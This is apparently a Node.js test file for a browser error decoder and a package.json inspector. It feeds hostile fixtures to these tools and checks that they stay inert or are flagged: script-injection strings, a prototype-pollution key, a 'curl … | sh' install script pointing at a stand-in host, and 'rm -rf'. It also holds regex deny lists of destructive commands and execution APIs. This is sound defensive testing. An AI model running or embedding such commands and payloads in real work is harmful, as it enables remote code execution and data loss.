import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import ts from "typescript";
import { performance } from "node:perf_hooks";

// Transpile the actual dependency-free tool logic, not a test reimplementation.
function load(path) {
  const source = fs.readFileSync(path, "utf8");
  const { outputText } = ts.transpileModule(source, { compilerOptions: { target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.CommonJS } });
  const compiledModule = { exports: {} };
  new Function("exports", "module", outputText)(compiledModule.exports, compiledModule);
  return compiledModule.exports;
}
const decoder = load("src/lib/error-decoder.ts");
const inspector = load("src/lib/package-inspector.ts");
const checks = [];
function test(name, run) { const started = performance.now(); run(); checks.push({ name, passed: true, milliseconds: Math.round((performance.now() - started) * 100) / 100 }); }
const ids = text => decoder.decodeError(text).matches.map(guide => guide.id);
const inspect = value => inspector.inspectPackage(JSON.stringify(value));

for (const guide of decoder.errorGuides) test(`Decoder example: ${guide.id}`, () => assert.deepEqual(ids(guide.example), [guide.id]));
test("CMD and PowerShell Node command lookup variants", () => {
  for (const input of ["'node' is not recognized as an internal or external command", "node : The term 'node' is not recognized as the name of a cmdlet", "The term 'node' is not recognized as a name of a cmdlet", "node: The term 'node' is not recognized as a name of a cmdlet"]) assert.deepEqual(ids(input), ["node-not-recognized"]);
});
test("CMD and PowerShell Git command lookup variants", () => {
  for (const input of ["'git' is not recognized as an internal or external command", "git : The term 'git' is not recognized as the name of a cmdlet", "The term 'git' is not recognized as a name of a cmdlet"]) assert.deepEqual(ids(input), ["git-not-recognized"]);
});
test("npm ANSI styling and CRLF are normalized", () => {
  const result = decoder.decodeError("\x1b[31mnpm ERR! code ERESOLVE\x1b[0m\r\n");
  assert.equal(result.removedFormatting, true); assert.equal(result.matches[0].id, "npm-eresolve");
});
test("PowerShell signature needs a launcher and policy context", () => {
  assert.deepEqual(ids("npm.ps1 is not digitally signed"), ["powershell-npm-policy"]);
  assert.deepEqual(ids("npm.ps1 completed successfully"), []);
  assert.deepEqual(ids("running scripts is disabled"), []);
});
test("Vercel wrapper requires platform context; named codes match", () => {
  assert.deepEqual(ids('Error: Command "npm run build" exited with 1'), []);
  assert.deepEqual(ids('/vercel/path0\nError: Command "npm run build" exited with 1'), ["vercel-deployment"]);
  for (const input of ["NO_OUTPUT_DIRECTORY", "FUNCTION_INVOCATION_TIMEOUT"]) assert.deepEqual(ids(input), ["vercel-deployment"]);
});
test("Multiple signatures stay distinct with deterministic ordering", () => {
  assert.deepEqual(ids("Vercel build failed\nModule not found: Can't resolve './test'\nnpm error code ERESOLVE"), ["npm-eresolve", "next-module", "vercel-deployment"]);
});
test("Unsupported errors get no invented guidance", () => {
  for (const text of ["EACCES permission denied", "502 Bad Gateway", "Everything is fine", ".* (a+)+$", "Cannot read properties of undefined", "node module installed", "git repository not found", "npm error code ENOENT", "EPERM unrelated OS log"]) assert.equal(decoder.decodeError(text).status, "unsupported");
});
test("Empty, control-only and oversized input fail safely", () => {
  assert.equal(decoder.decodeError("").status, "empty");
  assert.equal(decoder.decodeError("\u0000\u202e\x1b[31m").status, "empty");
  assert.equal(decoder.decodeError("npm ERESOLVE".padEnd(decoder.ERROR_INPUT_LIMIT + 1, "x")).status, "too-long");
  assert.equal(decoder.decodeError("npm ERESOLVE".padEnd(decoder.ERROR_INPUT_LIMIT, " ")).status, "matched");
});
test("Matching does not interpolate hostile log text into a report", () => {
  const hostile = '<script>globalThis.phase4Pwned=true</script>\nnpm error code EPERM\nSECRET_TOKEN=redacted-fixture';
  const report = decoder.errorReport(decoder.decodeError(hostile).matches);
  assert.ok(!report.includes("SECRET_TOKEN")); assert.ok(!report.includes("<script>")); assert.equal(globalThis.phase4Pwned, undefined);
});
test("React hydration wording variants", () => {
  for (const text of ["Text content does not match server-rendered HTML", "Hydration mismatch", "A tree hydrated but some attributes of the server rendered HTML didn't match"]) assert.deepEqual(ids(text), ["next-hydration"]);
});
test("Resolver wording variants and unqualified failure", () => {
  for (const text of ["Module not found: Error: Can't resolve 'fs'", "Cannot find module 'react'", "Module not found: Cannot resolve './X'"]) assert.deepEqual(ids(text), ["next-module"]);
  assert.deepEqual(ids("module not found somewhere"), []);
});
test("Every rule has scoped guidance and allowlisted references", () => {
  const hosts = ["docs.npmjs.com", "nodejs.org", "learn.microsoft.com", "git-scm.com", "nextjs.org", "vercel.com"];
  for (const guide of decoder.errorGuides) {
    assert.ok(guide.steps.length >= 3 && guide.causes.length && guide.scope && guide.caution && guide.commands && guide.related.length);
    assert.ok(!/Set-ExecutionPolicy|Remove-Item|rm -rf|--force|--legacy-peer-deps|git reset/.test(guide.commands));
    for (const ref of guide.references) assert.ok(hosts.includes(new URL(ref.href).hostname));
  }
});

test("Inspector empty, oversized and malformed JSON", () => {
  assert.equal(inspector.inspectPackage("  ").status, "empty");
  for (const raw of ['{"a":1,}', '{/*comment*/}', '{"scripts":', "\ufeff{}", "{unquoted:1}"]) assert.equal(inspector.inspectPackage(raw).status, "invalid");
  assert.equal(inspector.inspectPackage(" ".repeat(inspector.PACKAGE_INPUT_LIMIT + 1)).status, "too-long");
  for (const value of [null, [], "text", 1, false]) assert.equal(inspect(value).status, "invalid");
});
test("Dependency groups and scripts are summarized without running", () => {
  const result = inspect({ name: "demo", version: "1.0.0", private: true, engines: { node: ">=22" }, dependencies: { next: "16.2.6" }, devDependencies: { typescript: "^5.9.3" }, peerDependencies: { react: ">=19" }, optionalDependencies: { optional: "*" }, scripts: { dev: "next dev", postinstall: "echo not-executed" } });
  assert.equal(result.status, "inspected"); assert.equal(result.groups.length, 4); assert.equal(result.scripts.length, 2); assert.equal(result.scriptCount, 2); assert.equal(result.private, true); assert.equal(result.engine, ">=22"); assert.equal(result.scripts[1].lifecycle, true);
  assert.ok(result.findings.some(f => f.message.includes("postinstall"))); assert.equal(globalThis.phase4Pwned, undefined);
});
for (const [spec, expected] of [
  ["1.2.3", "Exact version"], ["0.0.1-alpha.0+build.1", "Exact version"], ["^0.2.3", "Caret range"], ["~1.2.3", "Tilde range"], ["*", "Wildcard / partial range"], ["1.2", "Wildcard / partial range"], ["1.x", "Wildcard / partial range"], [">=18 <23", "Range expression (not evaluated)"], ["1.0.0 - 2.0.0", "Range expression (not evaluated)"], ["^1 || ^2", "Range expression (not evaluated)"], ["latest", "Registry tag"], ["file:../local", "Local path / link"], ["link:../local", "Local path / link"], ["workspace:*", "Workspace protocol (manager-specific)"], ["npm:other@^1", "npm alias"], ["git+https://example.invalid/repo.git#main", "Git source"], ["owner/repo#tag", "Git source"], ["https://example.invalid/pkg.tgz", "Remote URL"], ["", "Empty specification"], ["some invalid range ???", "Unrecognized / complex specification"],
]) test(`Version pattern: ${spec || "(empty)"}`, () => assert.equal(inspector.classifyVersion(spec), expected));
test("Invalid field types produce useful diagnostics rather than crashes", () => {
  const result = inspect({ name: 4, version: false, private: "true", type: {}, packageManager: 2, engines: [], dependencies: [], devDependencies: null, peerDependencies: { foo: 4 }, scripts: { bad: null } });
  assert.equal(result.status, "inspected"); assert.ok(result.findings.filter(f => f.level === "error").length >= 10);
});
test("Top-level dependency and scripts containers are checked", () => {
  for (const field of ["dependencies", "devDependencies", "peerDependencies", "optionalDependencies", "scripts", "engines"]) assert.ok(inspect({ [field]: "wrong" }).findings.some(f => f.level === "error"));
});
test("Own version is not confused with a dependency range", () => {
  for (const version of ["^1.2.3", "01.2.3", "1.2.3-01", "1.2"]) assert.ok(inspect({ version }).findings.some(f => f.message.includes("strict three-part")));
  assert.ok(!inspect({ version: "1.2.3-beta.0+ok" }).findings.some(f => f.message.includes("strict three-part")));
});
test("Duplicate prod/dev declarations and non-npm effects are disclosed", () => {
  const result = inspect({ dependencies: { a: "1.0.0" }, devDependencies: { a: "^2.0.0" }, overrides: {}, resolutions: {}, workspaces: ["apps/*"] });
  assert.ok(result.findings.some(f => f.message.includes("both dependencies")));
  for (const field of ["overrides", "resolutions", "workspaces"]) assert.ok(result.findings.some(f => f.message.startsWith(field)));
});
test("Floating, non-registry and unknown patterns receive scoped guidance", () => {
  const result = inspect({ dependencies: { moving: "latest", local: "file:../local", unknown: "???" } });
  assert.ok(result.findings.some(f => f.message.includes("do not pin one version")));
  assert.ok(result.findings.some(f => f.message.includes("source provenance")));
  assert.ok(result.findings.some(f => f.message.includes("not recognized")));
});
test("Adversarial engines maps are bounded", () => {
  const result = inspect({ engines: Object.fromEntries(Array.from({ length: 205 }, (_, i) => [`engine-${i}`, false])) });
  assert.equal(result.findings.filter(f => f.level === "error").length, 200);
  assert.ok(result.findings.some(f => f.message.includes("first 200 engines")));
});
test("Script portability and suspicious literal patterns are heuristic warnings", () => {
  const result = inspect({ scripts: { posix: "NODE_ENV=production next start", exported: "export A=b && node x.js", removed: "rm -rf dist", piped: "curl https://example.invalid/setup | sh", portable: "cross-env NODE_ENV=production next start" } });
  assert.ok(result.findings.some(f => f.message.includes("scripts.posix") && f.level === "note"));
  assert.ok(result.findings.some(f => f.message.includes("scripts.exported")));
  assert.ok(result.findings.some(f => f.message.includes("scripts.removed") && f.level === "warning"));
  assert.ok(result.findings.some(f => f.message.includes("scripts.piped") && f.level === "warning"));
  assert.ok(!result.findings.some(f => f.message.includes("scripts.portable")));
});
test("packageManager, type and engines are checked without claiming runtime compatibility", () => {
  const result = inspect({ packageManager: "npm", type: "esm", engines: { node: ">=22", npm: 10 } });
  assert.equal(result.engine, ">=22"); assert.ok(result.findings.some(f => f.message.includes("manager@version"))); assert.ok(result.findings.some(f => f.message.includes("engines.npm"))); assert.ok(result.findings.some(f => f.message.includes('"module"')));
});
test("Large collections and display values stay bounded and disclose omissions", () => {
  const dependencies = Object.fromEntries(Array.from({ length: 205 }, (_, i) => [`package-${i}`, "1.0.0"]));
  const scripts = Object.fromEntries(Array.from({ length: 85 }, (_, i) => [`script-${i}`, "echo text"]));
  const result = inspect({ name: "n".repeat(1200), dependencies, scripts });
  assert.equal(result.groups[0].count, 205); assert.equal(result.groups[0].rows.length, 200); assert.equal(result.scriptCount, 85); assert.equal(result.scripts.length, 80); assert.ok(result.name.endsWith("[display shortened]")); assert.ok(result.findings.some(f => f.message.includes("remaining values were not inspected")));
});
test("Prototype keys and HTML/script strings remain inert", () => {
  const result = inspector.inspectPackage('{"__proto__":{"polluted":true},"dependencies":{"__proto__":"1.0.0","<img src=x onerror=alert(1)>":"latest"},"scripts":{"x":"globalThis.phase4Pwned=true"}}');
  assert.equal({}.polluted, undefined); assert.equal(globalThis.phase4Pwned, undefined); assert.equal(result.groups[0].rows[0].name, "__proto__"); assert.ok(inspector.packageReport(result).includes("<img"));
});
test("Nested unrelated data and duplicate JSON key limitation follow native parsing", () => {
  assert.equal(inspector.inspectPackage('{"name":"first","name":"last"}').name, "last");
  assert.equal(inspector.inspectPackage('{"custom":' + "[".repeat(1000) + "0" + "]".repeat(1000) + "}").status, "inspected");
});
test("Control characters are removed from displayed configuration strings", () => {
  const result = inspect({ name: "hello\u202eworld", scripts: { test: "echo\u0000 harmless" } });
  assert.equal(result.name, "helloworld"); assert.ok(!inspector.packageReport(result).includes("\u0000"));
});
test("Copy reports explicitly state their limits", () => {
  const result = inspect({ dependencies: { foo: "^1.0.0" }, scripts: { test: "echo test" } });
  const report = inspector.packageReport(result); assert.ok(report.includes("Compatibility, vulnerabilities and installed versions were not checked.")); assert.ok(report.includes("Scripts (text only)"));
});

// Source-boundary checks supplement runtime tests; they are not browser tests.
test("New client analysis contains no transport, storage or execution APIs", () => {
  for (const path of ["src/lib/error-decoder.ts", "src/lib/package-inspector.ts", "src/components/tools/ErrorDecoderTool.tsx", "src/components/tools/PackageJsonInspectorTool.tsx"]) {
    const source = fs.readFileSync(path, "utf8");
    assert.ok(!/\bfetch\s*\(|XMLHttpRequest|sendBeacon|localStorage|sessionStorage|indexedDB|\beval\s*\(|new Function|child_process|dangerouslySetInnerHTML|document\.cookie/.test(source), path);
  }
});
test("Clipboard handler is user-triggered and catches unavailable permissions", () => {
  const source = fs.readFileSync("src/components/tools/DiagnosticCopyButton.tsx", "utf8");
  assert.ok(source.includes("onClick={copy}")); assert.ok(source.includes("navigator.clipboard?.writeText")); assert.ok(source.includes("catch")); assert.ok(source.includes('role="status"'));
});

fs.mkdirSync("reports/phase4", { recursive: true });
fs.writeFileSync("reports/phase4/tool-tests.json", JSON.stringify({ checkedAt: new Date().toISOString(), environment: { os: os.version(), release: os.release(), architecture: os.arch(), node: process.version, typescript: ts.version }, counts: { passed: checks.length, failed: 0 }, checks, limitations: "Actual pure logic tests and source-boundary assertions, not browser interaction, npm dependency resolution, Windows 11, live deployments or proof of every suggested fix." }, null, 2));
console.log(`Phase 4 tool tests: ${checks.length} passed.`);
